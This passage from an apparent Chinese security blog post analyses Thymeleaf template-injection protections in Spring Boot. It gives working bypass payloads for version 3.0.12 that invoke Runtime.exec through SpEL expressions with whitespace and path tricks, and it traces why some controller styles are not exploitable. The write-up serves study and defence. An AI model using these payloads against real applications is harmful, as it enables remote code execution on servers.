<p>Thymeleaf3.0.12官方修复了该问，但仍存在绕过的可能性，故这里说一下</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A538.png" srcset="/img/loading.gif" lazyload></p>
<p>更改下pom文件，刷新一下</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.12.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span> <span class="hljs-comment">&lt;!-- lookup parent from repository --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A537.png" srcset="/img/loading.gif" lazyload></p>
<p>直接来到<code>org.thymeleaf.spring5.expression.SPELVariableExpressionEvaluator</code>的第156行</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A539.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 需要该方法返回一个false，这样就不会抛出异常</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">containsSpELInstantiationOrStatic</span><span class="hljs-params">(String expression)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> explen = expression.length();<br>    <span class="hljs-keyword">int</span> n = explen;		<span class="hljs-comment">// 表达式长度</span><br>    <span class="hljs-keyword">int</span> ni = <span class="hljs-number">0</span>;			<br>    <span class="hljs-keyword">int</span> si = -<span class="hljs-number">1</span>;<br>	<br>    <span class="hljs-keyword">while</span>(n-- != <span class="hljs-number">0</span>) &#123;	<span class="hljs-comment">// 从右往左遍历</span><br>        <span class="hljs-keyword">char</span> c = expression.charAt(n);	<span class="hljs-comment">// 判断是否有wen，也就是new的倒叙</span><br>        <span class="hljs-keyword">if</span> (ni &gt;= NEW_LEN || c != NEW_ARRAY[ni] || ni &lt;= <span class="hljs-number">0</span> &amp;&amp; (n + <span class="hljs-number">1</span> &gt;= explen || !Character.isWhitespace(expression.charAt(n + <span class="hljs-number">1</span>)))) &#123;<br>            <span class="hljs-keyword">if</span> (ni &gt; <span class="hljs-number">0</span>) &#123;<br>                n += ni;<br>                ni = <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">if</span> (si &lt; n) &#123;<br>                    si = -<span class="hljs-number">1</span>;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                ni = <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;)&#x27;</span>) &#123;<br>                    si = n;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-comment">// 判断(左边是否为T,T是否为表达式首字母</span><br>                    <span class="hljs-keyword">if</span> (si &gt; n &amp;&amp; c == <span class="hljs-string">&#x27;(&#x27;</span> &amp;&amp; n - <span class="hljs-number">1</span> &gt;= <span class="hljs-number">0</span> &amp;&amp; expression.charAt(n - <span class="hljs-number">1</span>) == <span class="hljs-string">&#x27;T&#x27;</span> &amp;&amp; (n - <span class="hljs-number">1</span> == <span class="hljs-number">0</span> || !Character.isJavaIdentifierPart(expression.charAt(n - <span class="hljs-number">2</span>)))) &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (si &gt; n &amp;&amp; !Character.isJavaIdentifierPart(c) &amp;&amp; c != <span class="hljs-string">&#x27;.&#x27;</span>) &#123;<br>                        si = -<span class="hljs-number">1</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            ++ni;<br>            <span class="hljs-keyword">if</span> (ni == NEW_LEN &amp;&amp; (n == <span class="hljs-number">0</span> || !Character.isJavaIdentifierPart(expression.charAt(n - <span class="hljs-number">1</span>)))) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>该段代码就是做了两个判断</p>
<ul>
<li>不能包含new</li>
<li><code>(</code>左边不能为T</li>
</ul>
<p>当满足这些条件时会返回<code>true</code>，导致直接抛出异常</p>
<p>想要绕过的话需要满足：</p>
<blockquote>
<p>1.不能有new，所以exp中不能有new</p>
<p>2.<code>(</code>左边的字符不能为T，所以需要在<code>(</code>左边增加一些其他字符不影响语句的字符</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 此处由于使用的是post传参，所以我能列举出来的如下</span><br><span class="hljs-comment">// 1.增加空格</span><br>__$&#123;T (java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)&#125;__::.x<br><span class="hljs-comment">// 2.制表符</span><br>__$&#123;T	(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)&#125;__::.x<br><span class="hljs-comment">// 3.换行符</span><br>__$&#123;T<br>(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)&#125;__::.x<br></code></pre></td></tr></table></figure>

<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A540.png" srcset="/img/loading.gif" lazyload></p>
<h5 id="3-0-12-场景2绕过"><a href="#3-0-12-场景2绕过" class="headerlink" title="3.0.12 场景2绕过"></a>3.0.12 场景2绕过</h5><p>这个场景是在<a target="_blank" rel="noopener" href="https://www.cnpanda.net/sec/1063.html">panda</a>这位师傅的文章上学到的，向师傅致敬</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// controller 视图名称包含在URL的路径或参数中</span><br><span class="hljs-meta">@GetMapping(&quot;/home/&#123;path&#125;&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">vulTest03</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String path)</span></span>&#123;<br>    log.info(<span class="hljs-string">&quot;path:&quot;</span> + path);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;home/&quot;</span> + path;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>当此种场景时，上述的exp是无法实现的</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A541.png" srcset="/img/loading.gif" lazyload></p>
<p>是因为在3.0.12新增了SpringRequestUtils.java该类，当<em>视图的名字和 path 一致</em>会经过该类的</p>
<p><code>checkViewNameNotInRequest()</code>方法进行检测</p>
<p>该方法是在<code>org.thymeleaf.spring5.view.ThymeleafView</code>第106行时进行调用</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A542.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">checkViewNameNotInRequest</span><span class="hljs-params">(String viewName, HttpServletRequest request)</span> </span>&#123;<br>    String vn = StringUtils.pack(viewName);<br>    String requestURI = StringUtils.pack(UriEscape.unescapeUriPath(request.getRequestURI()));<br>    <span class="hljs-keyword">boolean</span> found = requestURI != <span class="hljs-keyword">null</span> &amp;&amp; requestURI.contains(vn);	<br>    	<span class="hljs-comment">// URI不为空时，URI中包含视图名时 found为true</span><br>    <span class="hljs-keyword">if</span> (!found) &#123;<br>        Enumeration paramNames = request.getParameterNames();<br><br>        <span class="hljs-keyword">while</span>(!found &amp;&amp; paramNames.hasMoreElements()) &#123;<br>            String[] paramValues = request.getParameterValues((String)paramNames.nextElement());<br><br>            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; !found &amp;&amp; i &lt; paramValues.length; ++i) &#123;<br>                String paramValue = StringUtils.pack(UriEscape.unescapeUriQueryParam(paramValues[i]));<br>                <span class="hljs-keyword">if</span> (paramValue.contains(vn)) &#123;	<span class="hljs-comment">// 如果参数值中包含ViewName也抛出异常</span><br>                    found = <span class="hljs-keyword">true</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (found) &#123;	<span class="hljs-comment">// 抛出异常</span><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> TemplateProcessingException(<span class="hljs-string">&quot;View name is an executable expression, and it is present in a literal manner in request path or parameters, which is forbidden for security reasons.&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>因此想要绕过，则需要<code>requestURI.contains(vn)</code>值为假，具体分析过程参考师傅的文章，在此就不说了，直接放上EXP</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">home<span class="hljs-comment">//__$&#123;T (java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)&#125;__::.x</span><br>home;/__$&#123;T (java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)&#125;__::.x<br></code></pre></td></tr></table></figure>

<blockquote>
<p>exp2:</p>
<p>SpringBoot 有一个功能叫做矩阵变量，默认是禁用状态：</p>
<p>如果发现路径中存在分号，那么会调用<code>removeSemicolonContent</code>方法来移除分号</p>
</blockquote>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A543.png" srcset="/img/loading.gif" lazyload></p>
<h5 id="3-0-14"><a href="#3-0-14" class="headerlink" title="3.0.14"></a>3.0.14</h5><p>这个版本的<code>checkViewNameNotInRequest()</code>有了一些改动，这个暂时还不知道该如何过去😭</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">checkViewNameNotInRequest</span><span class="hljs-params">(String viewName, HttpServletRequest request)</span> </span>&#123;<br>    String vn = StringUtils.pack(viewName);	<span class="hljs-comment">// 获取视图名</span><br>    <span class="hljs-keyword">if</span> (containsExpression(vn)) &#123;	<span class="hljs-comment">// 判断视图名中是否包含thymeleaf的一些表达式</span><br>        <span class="hljs-keyword">boolean</span> found = <span class="hljs-keyword">false</span>;<br>        <span class="hljs-comment">// 获取URI</span><br>        String requestURI = StringUtils.pack(UriEscape.unescapeUriPath(request.getRequestURI()));<br>        <span class="hljs-keyword">if</span> (requestURI != <span class="hljs-keyword">null</span> &amp;&amp; containsExpression(requestURI)) &#123;	<span class="hljs-comment">// URI不为空，且URI中包含表达式，直接G</span><br>            found = <span class="hljs-keyword">true</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!found) &#123;<br>            Enumeration paramNames = request.getParameterNames();	<span class="hljs-comment">// 获取参数名并存入到枚举对象中</span><br><br>            <span class="hljs-keyword">while</span>(!found &amp;&amp; paramNames.hasMoreElements()) &#123;	<span class="hljs-comment">// 存在枚举元素</span><br>                <span class="hljs-comment">// 获取所有参数值，存入String[] 中</span><br>                String[] paramValues = request.getParameterValues((String)paramNames.nextElement());<br>		<br>                <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; !found &amp;&amp; i &lt; paramValues.length; ++i) &#123;	<br>                    String paramValue = StringUtils.pack(paramValues[i]);	<span class="hljs-comment">// 取出参数值</span><br>                    <span class="hljs-comment">// 参数值不为空，并且参数值中包含表达式，并且视图名称中包含该参数值，则G</span><br>                    <span class="hljs-keyword">if</span> (paramValue != <span class="hljs-keyword">null</span> &amp;&amp; containsExpression(paramValue) &amp;&amp; vn.contains(paramValue)) &#123;<br>                        found = <span class="hljs-keyword">true</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (found) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> TemplateProcessingException(<span class="hljs-string">&quot;View name contains an expression and so does either the URL path or one of the request parameters. This is forbidden in order to reduce the possibilities that direct user input is executed as a part of the view name.&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h4 id="2-ResponseBody"><a href="#2-ResponseBody" class="headerlink" title="2.@ResponseBody"></a>2.@ResponseBody</h4><p>@responseBody注解的作用是将controller的方法返回的对象通过适当的转换器转换为指定的格式之后，写入到response对象的body区，通常用来返回JSON数据或者是XML数据。也就是说现在服务端返回的只是一段数据（数据格式需要自行指定），不再是一个渲染之后的视图了，不需要渲染，自然不会存在表达式解析等步骤，所以此时不会存在。</p>
<p>示例：此处将controller的返回值为String，并且有@responseBody注解，不会再进行渲染，所以只是将path进行拼接之后返回</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-meta">@RequestMapping(&quot;/test&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">vulTest</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String path)</span></span>&#123;<br>    log.info(<span class="hljs-string">&quot;path:&quot;</span> + path);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;xxx/&quot;</span> + path + <span class="hljs-string">&quot;/zzz&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A521.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="3-redirect"><a href="#3-redirect" class="headerlink" title="3.redirect"></a>3.redirect</h4><p>重定向，直接跳转到其他页面，此时是因为springmvc不再使用Thymeleaf视图解析器，所以导致漏洞不存在了</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/test&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">vulTest</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String path)</span></span>&#123;<br>    log.info(<span class="hljs-string">&quot;path:&quot;</span> + path);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:xxx/&quot;</span> + path + <span class="hljs-string">&quot;/zzz&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A528.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="4-HttpServletResponse"><a href="#4-HttpServletResponse" class="headerlink" title="4.HttpServletResponse"></a>4.HttpServletResponse</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/test/&#123;path&#125;&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">vulTest02</span><span class="hljs-params">(HttpServletResponse response)</span></span>&#123;<br>        log.info(<span class="hljs-string">&quot;Test02&quot;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>自定义返回，当参数中存在HttpServletResponse时，SpringMVC认为此时用户自定义了返回数据，无需SpringMVC帮助处理，所以此种情况下同样不存在漏洞</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A529.png" srcset="/img/loading.gif" lazyload></p>
<p>其原因是当控制器存在HttpServletResponse类型的参数时，在获取变量时会将<code>ModelAndViewContainer</code>对象的<code>requestHandled</code>值置为true，进而导致<code>ModelAndViewContainer</code>对象为null，也就是mv为null。具体分析思路如下</p>
<p><code>DispatchServlet</code>    <code>ha.handle(processedRequest, response, mappedHandler.getHandler())</code> 处下断，跟进handle方法</p>
<p>来到<code>this.handleInternal(request, response, (HandlerMethod)handler);</code>，继续跟进</p>
<p>来到<code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter</code> 的 <code>handleInternal</code>方法</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A530.png" srcset="/img/loading.gif" lazyload></p>
<p>来到该类的<code>invokeHandlerMethod()</code>，一些基础设置没必要看，直接到来第543行，跟进</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A531.png" srcset="/img/loading.gif" lazyload></p>
<p>来到该类的<code>invokeAndHandle</code>方法，直接跟进<code>this.invokeForRequest(webRequest, mavContainer, providedArgs);</code></p>
<p>来到<code>org.springframework.web.method.support.InvocableHandlerMethod</code>的<code>invokeForRequest</code>方法</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A532.png" srcset="/img/loading.gif" lazyload></p>
<p>来到<code>getMethodArgumentValues</code>方法，该方法本身是用来获取参数的，但是<code>args[i] = this.resolvers.resolveArgument(parameter, mavContainer, request, this.dataBinderFactory);</code>这一行会改变<code>mavContainer</code>中<code>requestHandled</code>的值，直接跟进这一行</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Object[] getMethodArgumentValues(NativeWebRequest request, <span class="hljs-meta">@Nullable</span> ModelAndViewContainer mavContainer, Object... providedArgs) <span class="hljs-keyword">throws</span> Exception &#123;<br>    MethodParameter[] parameters = <span class="hljs-keyword">this</span>.getMethodParameters();<br>    <span class="hljs-keyword">if</span> (ObjectUtils.isEmpty(parameters)) &#123;	<span class="hljs-comment">// 判断参数列表是否为空</span><br>        <span class="hljs-keyword">return</span> EMPTY_ARGS;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        Object[] args = <span class="hljs-keyword">new</span> Object[parameters.length];	<span class="hljs-comment">// 创建一个Object数据，准备接收参数</span><br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; parameters.length; ++i) &#123;	<span class="hljs-comment">// 遍历参数列表</span><br>            MethodParameter parameter = parameters[i];<br>            parameter.initParameterNameDiscovery(<span class="hljs-keyword">this</span>.parameterNameDiscoverer);	<span class="hljs-comment">// 参数初始化</span><br>            args[i] = findProvidedArgument(parameter, providedArgs);	<span class="hljs-comment">// 一种假定？？不是很理解，但不重要</span><br>            <span class="hljs-keyword">if</span> (args[i] == <span class="hljs-keyword">null</span>) &#123;<br>                <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">this</span>.resolvers.supportsParameter(parameter)) &#123;	<br>                    <span class="hljs-comment">// 判断是否有合适的参数解析器，也就是判断是否支持该参数类型</span><br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalStateException(formatArgumentError(parameter, <span class="hljs-string">&quot;No suitable resolver&quot;</span>));<br>                &#125;<br><br>                <span class="hljs-keyword">try</span> &#123;	<br>                    args[i] = <span class="hljs-keyword">this</span>.resolvers.resolveArgument(parameter, mavContainer, request, <span class="hljs-keyword">this</span>.dataBinderFactory);	<span class="hljs-comment">// 获取参数，以及当参数类型为HttpServletResponse时做一些设置</span><br>                &#125; <span class="hljs-keyword">catch</span> (Exception var10) &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.logger.isDebugEnabled()) &#123;<br>                        String exMsg = var10.getMessage();<br>                        <span class="hljs-keyword">if</span> (exMsg != <span class="hljs-keyword">null</span> &amp;&amp; !exMsg.contains(parameter.getExecutable().toGenericString())) &#123;<br>                            <span class="hljs-keyword">this</span>.logger.debug(formatArgumentError(parameter, exMsg));<br>                        &#125;<br>                    &#125;<br><br>                    <span class="hljs-keyword">throw</span> var10;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> args;	<span class="hljs-comment">// 返回参数列表</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>来到<code>org.springframework.web.method.support.HandlerMethodArgumentResolverComposite</code>的<code>resolveArgument</code>方法</p>
<p>当参数类型是：普通参数类型（例如：String\Integer\Double）时</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A533.png" srcset="/img/loading.gif" lazyload></p>
<p>此时跟进第65行，进入到<code>org.springframework.web.method.annotation.AbstractNamedValueMethodArgumentResolver</code>的<code>resolveArgument</code>方法中</p>
<p>当参数类型是：HttpServletResponse时</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A534.png" srcset="/img/loading.gif" lazyload></p>
<p>此时跟进第65行，进入到<code>org.springframework.web.servlet.mvc.method.annotation.ServletResponseMethodArgumentResolver</code>的<code>resolveArgument</code>方法中</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">resolveArgument</span><span class="hljs-params">(MethodParameter parameter, <span class="hljs-meta">@Nullable</span> ModelAndViewContainer mavContainer, NativeWebRequest webRequest, <span class="hljs-meta">@Nullable</span> WebDataBinderFactory binderFactory)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>    <span class="hljs-keyword">if</span> (mavContainer != <span class="hljs-keyword">null</span>) &#123;		<span class="hljs-comment">// 为真</span><br>        mavContainer.setRequestHandled(<span class="hljs-keyword">true</span>);  <span class="hljs-comment">// requestHandled的值设置为true</span><br>    &#125;<br><br>    Class&lt;?&gt; paramType = parameter.getParameterType();<br>    <span class="hljs-keyword">return</span> ServletResponse.class.isAssignableFrom(paramType) ? <span class="hljs-keyword">this</span>.resolveNativeResponse(webRequest, paramType) : <span class="hljs-keyword">this</span>.resolveArgument(paramType, (ServletResponse)<span class="hljs-keyword">this</span>.resolveNativeResponse(webRequest, ServletResponse.class));<br>&#125;<br></code></pre></td></tr></table></figure>

<p>回到<code>RequestMappingHandlerAdapter</code>第545行，跟进</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A535.png" srcset="/img/loading.gif" lazyload></p>
<p>来到<code>RequestMappingHandlerAdapter</code>第545行</p>
<p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A536.png" srcset="/img/loading.gif" lazyload></p>
<p>到这里基本理解了mv为空的原因，mv为空，不需要渲染了，所以漏洞也不存在了</p>
<h3 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h3><ul>
<li><a target="_blank" rel="noopener" href="https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html#messages">教程：使用 Thymeleaf</a></li>
<li><a target="_blank" rel="noopener" href="https://forum.butian.net/index.php/share/1922">Thymeleaf SSTI</a></li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254519#h3-5">Java安全之Thymeleaf SSTI分析</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8568#toc-3">由WCTF2020 Thymeleaf分析payload形式</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/veracode-research/spring-view-manipulation">spring-view-manipulation</a></li>
